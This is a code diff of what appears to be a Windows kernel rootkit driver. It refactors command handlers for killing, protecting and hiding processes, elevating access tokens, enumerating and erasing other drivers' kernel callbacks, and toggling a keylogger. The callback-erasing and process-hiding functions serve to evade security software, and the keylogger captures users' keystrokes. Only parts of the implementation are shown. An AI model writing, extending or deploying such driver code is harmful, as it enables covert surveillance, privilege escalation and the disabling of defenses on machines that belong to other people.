@@ -15,53 +15,18 @@
 // --------------------------------------------------------------------------------------------------------
 // Command
 
-enum COMMAND_TYPE 
+enum COMMAND_TYPE
 {
-    NONE,
-    KILL_PROCESS,
-    PROTECT_PROCESS,
-    ELEVATE_TOKEN,
-    HIDE_PROCESS,
-    ENUM_PROCESS_CALLBACKS,
-    ENUM_THREAD_CALLBACKS,
-    ERASE_CALLBACKS,
-    START_KEYLOGGER,
-    GET_KEYLOG
+    NONE = 0,
+    KILL_PROCESS = 1,
+    PROTECT_PROCESS = 2,
+    ELEVATE_TOKEN = 3,
+    HIDE_PROCESS = 4,
+    ENUM_CALLBACKS = 5,
+    ERASE_CALLBACKS = 6,
+    START_KEYLOGGER = 7,
+    UNLOAD = 8
 };
-
-typedef struct _PROTECT_PROCESS_PAYLOAD {
-    COMMAND_TYPE cmdType;
-    ULONG pid;
-    BYTE newProtectionLevel;
-} PROTECT_PROCESS_PAYLOAD;
-
-typedef struct _EMPTY_PAYLOAD {
-    COMMAND_TYPE cmdType;
-};
-
-typedef struct _PID_PAYLOAD {
-    COMMAND_TYPE cmdType;
-    ULONG pid;
-};
-
-typedef struct _DWORD_PAYLOAD {
-    COMMAND_TYPE cmdType;
-    DWORD dw;
-};
-
-typedef struct _WSTR_PAYLOAD {
-    COMMAND_TYPE cmdType;
-    WCHAR charString[64];
-};
-
-using KILL_PROCESS_PAYLOAD = _PID_PAYLOAD;
-using HIDE_PROCESS_PAYLOAD = _PID_PAYLOAD;
-using ELEVATE_PROCESS_PAYLOAD = _PID_PAYLOAD;
-using ERASE_CALLBACKS_PAYLOAD = _WSTR_PAYLOAD;
-using ENUM_PROCESS_CALLBACKS_PAYLOAD = _EMPTY_PAYLOAD;
-using ENUM_THREAD_CALLBACKS_PAYLOAD = _EMPTY_PAYLOAD;
-using START_KEYLOGGER_PAYLOAD = _DWORD_PAYLOAD;
-using GET_KEYLOG_PAYLOAD = _EMPTY_PAYLOAD;
 
 // --------------------------------------------------------------------------------------------------------
 
@@ -78,81 +43,11 @@ NTSTATUS BeCmd_ProtectProcess(ULONG pid, BYTE newProcessProtection);
 NTSTATUS BeCmd_ElevateProcessAcessToken(HANDLE pid);
 NTSTATUS BeCmd_KillProcess(HANDLE pid);
 NTSTATUS BeCmd_HideProcess(HANDLE pid);
-NTSTATUS BeCmd_EnumerateCallbacks(CALLBACK_TYPE type);
-NTSTATUS BeCmd_EraseCallbacks(PWCHAR targetDriver);
+ktd::vector<KernelCallback, PagedPool> BeCmd_EnumerateCallbacks(CALLBACK_TYPE callbackType);
+NTSTATUS BeCmd_EraseCallbacks(PWCHAR targetDriver, CALLBACK_TYPE cbType);
 NTSTATUS BeCmd_StartKeylogger(BOOLEAN start);
 
 // --------------------------------------------------------------------------------------------------------
-
-/**
- * TODO
- */
-NTSTATUS 
-BeExecuteCommand(PVOID commandBuffer)
-{
-    NTSTATUS status;
-
-    DWORD commandType = ((DWORD*)commandBuffer)[0];
-
-    switch (commandType)
-    {
-    case KILL_PROCESS:
-        {
-            ULONG targetPid = ((KILL_PROCESS_PAYLOAD*)commandBuffer)->pid;
-            status = BeCmd_KillProcess(ULongToHandle(targetPid));
-        }
-        break;
-
-    case ELEVATE_TOKEN:
-        {
-            ULONG targetPid = ((ELEVATE_PROCESS_PAYLOAD*)commandBuffer)->pid;
-            status = BeCmd_ElevateProcessAcessToken(ULongToHandle(targetPid));
-        }
-        break;
-
-    case PROTECT_PROCESS:
-        {
-            auto payload = ((PROTECT_PROCESS_PAYLOAD*)commandBuffer);
-            status = BeCmd_ProtectProcess(payload->pid, payload->newProtectionLevel);
-        }
-        break;
-
-    case HIDE_PROCESS:
-        {
-            ULONG targetPid = ((HIDE_PROCESS_PAYLOAD*)commandBuffer)->pid;
-            status = BeCmd_HideProcess(ULongToHandle(targetPid));
-        }
-        break;
-
-    case ENUM_PROCESS_CALLBACKS:
-        {
-            status = BeCmd_EnumerateCallbacks(CreateProcessNotifyRoutine);
-        }
-        break;
-
-    case ENUM_THREAD_CALLBACKS:
-        {
-            status = BeCmd_EnumerateCallbacks(CreateThreadNotifyRoutine);
-        }
-        break;
-
-    case ERASE_CALLBACKS:
-        { 
-            PWCHAR targetDriver = ((ERASE_CALLBACKS_PAYLOAD*)commandBuffer)->charString;
-            status = BeCmd_EraseCallbacks(targetDriver);
-        }
-        break;
-
-    case START_KEYLOGGER:
-        {
-            BOOLEAN start = (BOOLEAN)((START_KEYLOGGER_PAYLOAD*)commandBuffer)->dw;
-            status = BeCmd_StartKeylogger(start);
-        }
-        break;
-    }
-
-    return status;
-}
 
 /**
  * Method for setting the protection of an arbitrary process by PID.
@@ -170,7 +65,6 @@ BeCmd_ProtectProcess(ULONG pid, BYTE newProtectionLevel)
     PEPROCESS process = BeGetEprocessByPid(pid);
     if (process == NULL)
     {
-        ObDereferenceObject(process);
         return STATUS_INVALID_PARAMETER_1;
     }
 
@@ -297,63 +191,30 @@ BeCmd_HideProcess(HANDLE pid)
  * Enumerates kernel callbacks
  *
  * @param type Type of callback to resolve
- * @return NTSTATUS status code.
+ * @returns ktd::vector<KernelCallback, PagedPool> Vector of callbacks
  */
-NTSTATUS
+ktd::vector<KernelCallback, PagedPool>
 BeCmd_EnumerateCallbacks(CALLBACK_TYPE type)
 {
     NTSTATUS NtStatus = STATUS_UNSUCCESSFUL;
     LOG_MSG("IOCTL enumerate callbacks\r\n");
 
-    // TODO
-    /*
-    __try
-    {
-        // find callbacks
-        auto callbackVector = BeEnumerateKernelCallbacks(type);
-
-        // setup buffer
-        ULONG dwDataSize = callbackVector.size() * sizeof(CALLBACK_DATA);
-
-        // write buffer to output buffer
-        for (INT i = 0; i < callbackVector.size(); ++i)
-        {
-            RtlCopyMemory(&(pOutputBuffer[i].driverBase), &(callbackVector[i].driverBase), sizeof(UINT64));
-            RtlCopyMemory(&(pOutputBuffer[i].offset), &(callbackVector[i].offset), sizeof(UINT64));
-            if (!BeIsStringNull(callbackVector[i].driverName))
-            {
-                SIZE_T strLen = wcslen(callbackVector[i].driverName) + 1;
-                DbgPrint("Size: %i of %ws\r\n", strLen, callbackVector[i].driverName);
-                RtlCopyMemory(&(pOutputBuffer[i].driverName), callbackVector[i].driverName, strLen * sizeof(WCHAR));
-            }
-        }
-
-        LOG_MSG("Copied\r\n");
-
-        NtStatus = STATUS_SUCCESS;
-        }
-    }
-    __except (EXCEPTION_EXECUTE_HANDLER)
-    {
-        NtStatus = GetExceptionCode();
-    }
-    */
-
-    return NtStatus;
+    return BeEnumerateKernelCallbacks(type);
 }
 
 /**
  * Replaces all kernel callbacks of a specified driver with empty callbacks.
- *
+
+ * @param targetDriver Name of target driver
+ * @param cbType type of callback to remove
  * @return NTSTATUS status code.
  */
 NTSTATUS
-BeCmd_EraseCallbacks(PWCHAR targetDriver)
+BeCmd_EraseCallbacks(PWCHAR targetDriver, CALLBACK_TYPE cbType)
 {
     NTSTATUS NtStatus = STATUS_UNSUCCESSFUL;
 
-    // TODO: also get type of callback. for now hardcoded to createprocess callbacks
-    NtStatus = BeReplaceKernelCallbacksOfDriver(targetDriver, CreateProcessNotifyRoutine);
+    NtStatus = BeReplaceKernelCallbacksOfDriver(targetDriver, cbType);
 
     return NtStatus;
 }
@@ -368,6 +229,7 @@ NTSTATUS
 BeCmd_StartKeylogger(BOOLEAN start)
 {
     BeGlobals::logKeys = start;
+    LOG_MSG("Log keys: %d\n", start);
 
     return STATUS_SUCCESS;
 }
